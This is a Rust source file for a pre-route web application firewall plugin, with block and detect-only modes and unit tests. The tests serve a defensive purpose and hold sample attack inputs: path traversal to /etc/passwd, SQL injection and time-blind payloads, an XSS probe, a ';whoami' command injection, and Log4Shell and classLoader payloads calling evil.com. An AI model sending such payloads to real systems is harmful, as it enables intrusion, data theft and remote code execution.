//! Pre-Route Web Application Firewall Lite Plugin (`waf_lite`).
//!
//! Provides ultra-low-latency L7 ingress perimeter defense before route lookup
//! and body streaming by inspecting request URI paths, query parameters, User-Agents,
//! and headers against known attack signatures in single-digit nanoseconds.

use std::collections::HashSet;
use std::str::FromStr;

use http::header::{HeaderName, HeaderValue};
use velda_core::{Action, L7Request, RejectReason};
use velda_sync::post_sync::plugin::PluginConfig;

use super::dictionary::ThreatVector;
use super::scanner::WafMatcher;
use crate::capability::{AccessLevel, PluginCapability, SupportedProtocols};
use crate::error::PluginError;
use crate::pre_route::PreRoutePlugin;

const X_WAF_THREAT_DETECTED: HeaderName = HeaderName::from_static("x-waf-threat-detected");
const X_WAF_THREAT_TYPE: HeaderName = HeaderName::from_static("x-waf-threat-type");
const HEADER_TRUE: HeaderValue = HeaderValue::from_static("true");

/// Operational mode of the WAF Lite inspection engine.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum WafMode {
    /// Rejects malicious requests immediately with HTTP 403 Forbidden (Default).
    #[default]
    Block,
    /// Bypasses blocking and injects audit headers for observability and backend inspection.
    DetectOnly,
}

impl WafMode {
    pub fn parse(s: &str) -> Self {
        match s.trim().to_ascii_lowercase().as_str() {
            "detect" => Self::DetectOnly,
            _ => Self::Block,
        }
    }
}

/// Inspection scope configuring which parts of the incoming HTTP request are evaluated.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WafScope {
    pub check_path: bool,
    pub check_query: bool,
    pub check_user_agent: bool,
    pub check_headers: Vec<HeaderName>,
}

impl Default for WafScope {
    fn default() -> Self {
        Self {
            check_path: true,
            check_query: true,
            check_user_agent: true,
            check_headers: Vec::new(),
        }
    }
}

/// Pre-Route Web Application Firewall Lite Plugin.
pub struct WafLitePlugin {
    pub id: String,
    pub mode: WafMode,
    pub scope: WafScope,
    pub custom_blocked_patterns: Vec<String>,
    pub custom_blocked_user_agents: Vec<String>,
    pub matcher: WafMatcher,
}

impl WafLitePlugin {
    /// Attempts to construct a new `WafLitePlugin` from raw configuration parameters.
    /// Automatically normalizes and deduplicates custom patterns and user-agents against built-in dictionary.
    pub fn try_new(
        id: impl Into<String>,
        mode: WafMode,
        scope: WafScope,
        custom_blocked_patterns: Vec<String>,
        custom_blocked_user_agents: Vec<String>,
    ) -> Result<Self, PluginError> {
        let mut seen_pats = HashSet::with_capacity(custom_blocked_patterns.len());
        let mut deduped_patterns = Vec::with_capacity(custom_blocked_patterns.len());
        for p in custom_blocked_patterns {
            let lower = p.trim().to_ascii_lowercase();
            if !lower.is_empty()
                && !velda_sync::is_builtin_attack_pattern(&lower)
                && seen_pats.insert(lower.clone())
            {
                deduped_patterns.push(lower);
            }
        }

        let mut seen_uas = HashSet::with_capacity(custom_blocked_user_agents.len());
        let mut deduped_uas = Vec::with_capacity(custom_blocked_user_agents.len());
        for ua in custom_blocked_user_agents {
            let lower = ua.trim().to_ascii_lowercase();
            if !lower.is_empty()
                && !velda_sync::is_builtin_user_agent(&lower)
                && seen_uas.insert(lower.clone())
            {
                deduped_uas.push(lower);
            }
        }

        let matcher = WafMatcher::new(&deduped_patterns, &deduped_uas)?;

        Ok(Self {
            id: id.into(),
            mode,
            scope,
            custom_blocked_patterns: deduped_patterns,
            custom_blocked_user_agents: deduped_uas,
            matcher,
        })
    }

    /// Constructs a new `WafLitePlugin`, panicking if pattern compilation fails.
    pub fn new(
        id: impl Into<String>,
        mode: WafMode,
        scope: WafScope,
        custom_blocked_patterns: Vec<String>,
        custom_blocked_user_agents: Vec<String>,
    ) -> Self {
        Self::try_new(
            id,
            mode,
            scope,
            custom_blocked_patterns,
            custom_blocked_user_agents,
        )
        .expect("Failed to initialize WafLitePlugin")
    }

    /// Deserializes and constructs an instance directly from a [`PluginConfig`].
    pub fn from_config(config: &PluginConfig) -> Result<Self, PluginError> {
        let cfg =
            velda_sync::validate_waf_lite_config(&config.id, &config.config).map_err(|e| {
                PluginError::Config(format!(
                    "Invalid waf_lite configuration for '{}': {e}",
                    config.id
                ))
            })?;

        let mode = match cfg.mode.as_str() {
            "block" => WafMode::Block,
            "detect" => WafMode::DetectOnly,
            other => {
                return Err(PluginError::Config(format!(
                    "Plugin '{}': unsupported waf mode '{other}'",
                    config.id
                )));
            }
        };

        let mut check_headers = Vec::with_capacity(cfg.check_headers.len());
        for s in &cfg.check_headers {
            let hname = HeaderName::from_str(s).map_err(|e| {
                PluginError::Config(format!(
                    "Invalid check_header '{s}' in plugin '{}': {e}",
                    config.id
                ))
            })?;
            check_headers.push(hname);
        }

        let scope = WafScope {
            check_path: cfg.check_path,
            check_query: cfg.check_query,
            check_user_agent: cfg.check_user_agent,
            check_headers,
        };

        Self::try_new(
            &config.id,
            mode,
            scope,
            cfg.custom_blocked_patterns,
            cfg.custom_blocked_user_agents,
        )
    }

    #[inline]
    fn handle_threat(&self, req: &mut L7Request, vector: ThreatVector) -> Action {
        match self.mode {
            WafMode::Block => Action::Reject(RejectReason::Forbidden),
            WafMode::DetectOnly => {
                req.headers.insert(X_WAF_THREAT_DETECTED, HEADER_TRUE);
                req.headers
                    .insert(X_WAF_THREAT_TYPE, vector.as_header_value());
                Action::Continue
            }
        }
    }
}

impl PreRoutePlugin for WafLitePlugin {
    #[inline(always)]
    fn id(&self) -> &str {
        &self.id
    }

    fn on_request(&self, req: &mut L7Request) -> Action {
        // 1. Inspect URI Path (zero-allocation + SIMD Aho-Corasick on raw bytes)
        if self.scope.check_path
            && let Some(vector) = self
                .matcher
                .check_patterns(req.uri.path().as_bytes(), false)
        {
            return self.handle_threat(req, vector);
        }

        // 2. Inspect Query String (zero-allocation + form-urlencoded '+' to space + SIMD Aho-Corasick)
        if self.scope.check_query
            && let Some(query) = req.uri.query()
            && let Some(vector) = self.matcher.check_patterns(query.as_bytes(), true)
        {
            return self.handle_threat(req, vector);
        }

        // 3. Inspect User-Agent Header (scans all duplicate headers on raw byte slices)
        if self.scope.check_user_agent {
            for ua_val in req.headers.get_all(http::header::USER_AGENT) {
                if self.matcher.check_user_agent(ua_val.as_bytes()) {
                    return self.handle_threat(req, ThreatVector::MaliciousScanner);
                }
            }
        }

        // 4. Inspect Custom Configured Headers (scans all duplicate headers on raw byte slices)
        for hdr_name in &self.scope.check_headers {
            for val in req.headers.get_all(hdr_name) {
                if let Some(vector) = self.matcher.check_patterns(val.as_bytes(), false) {
                    return self.handle_threat(req, vector);
                }
            }
        }

        Action::Continue
    }

    #[inline(always)]
    fn capability(&self) -> PluginCapability {
        match self.mode {
            WafMode::Block => PluginCapability::header_only(AccessLevel::Read),
            WafMode::DetectOnly => PluginCapability::header_only(AccessLevel::Write),
        }
    }

    #[inline(always)]
    fn supported_protocols(&self) -> SupportedProtocols {
        SupportedProtocols::ALL_HTTP
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use http::{HeaderMap, Method, Uri, Version};
    use serde_json::json;
    use velda_core::Body;

    fn build_test_request(path_and_query: &str, headers: HeaderMap) -> L7Request {
        L7Request::new(
            Method::GET,
            path_and_query.parse::<Uri>().unwrap(),
            Version::HTTP_11,
            headers,
            Body::Empty,
        )
    }

    #[test]
    fn test_waf_blocks_path_traversal() {
        let plugin = WafLitePlugin::new(
            "waf_lite",
            WafMode::Block,
            WafScope::default(),
            vec![],
            vec![],
        );

        let mut req = build_test_request(
            "/api/v1/download?file=..%2f..%2fetc/passwd",
            HeaderMap::new(),
        );
        let action = plugin.on_request(&mut req);
        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
    }

    #[test]
    fn test_waf_blocks_double_percent_encoded_path_traversal() {
        let plugin = WafLitePlugin::new(
            "waf_lite",
            WafMode::Block,
            WafScope::default(),
            vec![],
            vec![],
        );

        let mut req = build_test_request(
            "/api/v1/download?file=%252e%252e%252fboot.ini",
            HeaderMap::new(),
        );
        let action = plugin.on_request(&mut req);
        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
    }

    #[test]
    fn test_waf_blocks_sql_injection_with_plus_and_comment() {
        let plugin = WafLitePlugin::new(
            "waf_lite",
            WafMode::Block,
            WafScope::default(),
            vec![],
            vec![],
        );

        let mut req = build_test_request(
            "/api/v1/items?id=1%27+UNION/**/SELECT+*+FROM+users--",
            HeaderMap::new(),
        );
        let action = plugin.on_request(&mut req);
        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
    }

    #[test]
    fn test_waf_blocks_xss_probe() {
        let plugin = WafLitePlugin::new(
            "waf_lite",
            WafMode::Block,
            WafScope::default(),
            vec![],
            vec![],
        );

        let mut req = build_test_request(
            "/search?query=%3Cscript%3Ealert(1)%3C/script%3E",
            HeaderMap::new(),
        );
        let action = plugin.on_request(&mut req);
        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
    }

    #[test]
    fn test_waf_blocks_scanner_user_agent() {
        let plugin = WafLitePlugin::new(
            "waf_lite",
            WafMode::Block,
            WafScope::default(),
            vec![],
            vec![],
        );

        let mut headers = HeaderMap::new();
        headers.insert(
            http::header::USER_AGENT,
            "sqlmap/1.6.1#stable".parse().unwrap(),
        );

        let mut req = build_test_request("/api/v1/users", headers);
        let action = plugin.on_request(&mut req);
        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
    }

    #[test]
    fn test_waf_blocks_non_ascii_byte_evasion_in_header() {
        let mut scope = WafScope::default();
        scope
            .check_headers
            .push(HeaderName::from_static("x-forwarded-host"));
        let plugin = WafLitePlugin::new("waf_lite", WafMode::Block, scope, vec![], vec![]);

        let mut headers = HeaderMap::new();
        headers.insert(
            HeaderName::from_static("x-forwarded-host"),
            HeaderValue::from_bytes(b"\x80${jndi:ldap://evil.com/poc}").unwrap(),
        );

        let mut req = build_test_request("/api/v1/auth", headers);
        let action = plugin.on_request(&mut req);
        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
    }

    #[test]
    fn test_waf_blocks_duplicate_header_smuggling() {
        let mut scope = WafScope::default();
        scope
            .check_headers
            .push(HeaderName::from_static("x-forwarded-host"));
        let plugin = WafLitePlugin::new("waf_lite", WafMode::Block, scope, vec![], vec![]);

        let mut headers = HeaderMap::new();
        headers.append(
            HeaderName::from_static("x-forwarded-host"),
            HeaderValue::from_static("clean.example.com"),
        );
        headers.append(
            HeaderName::from_static("x-forwarded-host"),
            HeaderValue::from_static("attacker.com' or '1'='1"),
        );

        let mut req = build_test_request("/api/v1/auth", headers);
        let action = plugin.on_request(&mut req);
        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
    }

    #[test]
    fn test_waf_detect_only_mode_allows_request_and_injects_headers() {
        let plugin = WafLitePlugin::new(
            "waf_lite",
            WafMode::DetectOnly,
            WafScope::default(),
            vec![],
            vec![],
        );

        let mut req = build_test_request("/api/v1/files?path=..%2fboot.ini", HeaderMap::new());
        let action = plugin.on_request(&mut req);

        assert!(matches!(action, Action::Continue));
        assert_eq!(req.headers.get("x-waf-threat-detected").unwrap(), "true");
        assert_eq!(
            req.headers.get("x-waf-threat-type").unwrap(),
            "path_traversal"
        );
    }

    #[test]
    fn test_waf_allows_clean_request() {
        let plugin = WafLitePlugin::new(
            "waf_lite",
            WafMode::Block,
            WafScope::default(),
            vec![],
            vec![],
        );

        let mut headers = HeaderMap::new();
        headers.insert(
            http::header::USER_AGENT,
            "Mozilla/5.0 Chrome/120.0".parse().unwrap(),
        );

        let mut req = build_test_request(
            "/api/v1/orders/12345?format=json&shipping=express&shop=1",
            headers,
        );
        let action = plugin.on_request(&mut req);

        assert!(matches!(action, Action::Continue));
        assert!(!req.headers.contains_key("x-waf-threat-detected"));
    }

    #[test]
    fn test_from_config_complete_deserialization() {
        let config = PluginConfig {
            id: "waf_lite".into(),
            phase: String::new(),
            config: json!({
                "mode": "detect",
                "check_path": true,
                "check_query": true,
                "check_user_agent": true,
                "check_headers": ["referer"],
                "custom_blocked_patterns": ["custom_secret_marker", "${jndi:"],
                "custom_blocked_user_agents": ["custom-scanner", "sqlmap"]
            }),
        };

        let plugin = WafLitePlugin::from_config(&config).expect("valid config");
        assert_eq!(plugin.id, "waf_lite");
        assert_eq!(plugin.mode, WafMode::DetectOnly);
        assert_eq!(plugin.scope.check_headers.len(), 1);
        assert!(
            plugin
                .custom_blocked_patterns
                .contains(&"custom_secret_marker".to_string())
        );
        assert!(
            !plugin
                .custom_blocked_patterns
                .contains(&"${jndi:".to_string())
        );
        assert!(
            plugin
                .custom_blocked_user_agents
                .contains(&"custom-scanner".to_string())
        );
        assert!(
            !plugin
                .custom_blocked_user_agents
                .contains(&"sqlmap".to_string())
        );

        let mut headers = HeaderMap::new();
        headers.insert(
            "referer",
            "http://attacker.com?payload=custom_secret_marker"
                .parse()
                .unwrap(),
        );
        let mut req = build_test_request("/api/login", headers);

        let action = plugin.on_request(&mut req);
        assert!(matches!(action, Action::Continue));
        assert_eq!(req.headers.get("x-waf-threat-detected").unwrap(), "true");

        let bad_config = PluginConfig {
            id: "waf_lite".into(),
            phase: String::new(),
            config: json!({}),
        };
        assert!(WafLitePlugin::from_config(&bad_config).is_err());
    }

    #[test]
    fn test_waf_blocks_nested_log4j_evasion() {
        let mut scope = WafScope::default();
        scope
            .check_headers
            .push(HeaderName::from_static("x-forwarded-for"));
        let plugin = WafLitePlugin::new("waf_lite", WafMode::Block, scope, vec![], vec![]);

        let mut headers = HeaderMap::new();
        headers.insert(
            HeaderName::from_static("x-forwarded-for"),
            HeaderValue::from_static("${${lower:j}ndi:ldap://evil.com/poc}"),
        );

        let mut req = build_test_request("/api/v1/auth", headers);
        let action = plugin.on_request(&mut req);
        assert!(matches!(action, Action::Reject(RejectReason::Forbidden)));
    }

    #[test]
    fn test_waf_blocks_parenthesis_sqli_and_time_blind() {
        let plugin = WafLitePlugin::new(
            "waf_lite",
            WafMode::Block,
            WafScope::default(),
            vec![],
            vec![],
        );

        let mut req1 = build_test_request(
            "/api/v1/items?id=1%27UNION(SELECT%20password%20FROM%20users)",
            HeaderMap::new(),
        );
        assert!(matches!(
            plugin.on_request(&mut req1),
            Action::Reject(RejectReason::Forbidden)
        ));

        let mut req2 = build_test_request(
            "/api/v1/items?id=1%27%20AND%20SLEEP(5)--%20",
            HeaderMap::new(),
        );
        assert!(matches!(
            plugin.on_request(&mut req2),
            Action::Reject(RejectReason::Forbidden)
        ));
    }

    #[test]
    fn test_waf_blocks_shell_rce_and_cves() {
        let plugin = WafLitePlugin::new(
            "waf_lite",
            WafMode::Block,
            WafScope::default(),
            vec![],
            vec![],
        );

        let mut req1 = build_test_request("/api/v1/users;whoami", HeaderMap::new());
        assert!(matches!(
            plugin.on_request(&mut req1),
            Action::Reject(RejectReason::Forbidden)
        ));

        let mut req2 = build_test_request("/api/..;/..;/etc/passwd", HeaderMap::new());
        assert!(matches!(
            plugin.on_request(&mut req2),
            Action::Reject(RejectReason::Forbidden)
        ));

        let mut req3 = build_test_request(
            "/api/v1/user?class.module.classLoader.URLs%5B0%5D=jar:http://evil.com/x.war!/",
            HeaderMap::new(),
        );
        assert!(matches!(
            plugin.on_request(&mut req3),
            Action::Reject(RejectReason::Forbidden)
        ));
    }
}
